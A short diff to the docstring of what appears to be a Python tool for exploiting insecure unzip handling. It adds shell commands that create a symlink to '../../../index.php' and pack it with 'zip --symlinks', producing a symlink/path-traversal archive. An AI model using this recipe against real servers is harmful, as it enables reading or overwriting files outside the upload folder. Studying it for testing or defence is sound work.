@@ -1,7 +1,10 @@
 """
 "insecure unzip 
 rename files in archives ../../../file
-
+cat > tst.txt << EIF
+EIF
+ln -sfn ../../../index.php tst.txt
+zip tst.zip tst.txt --symlinks
 """
 from  sys import argv,exit
 import os
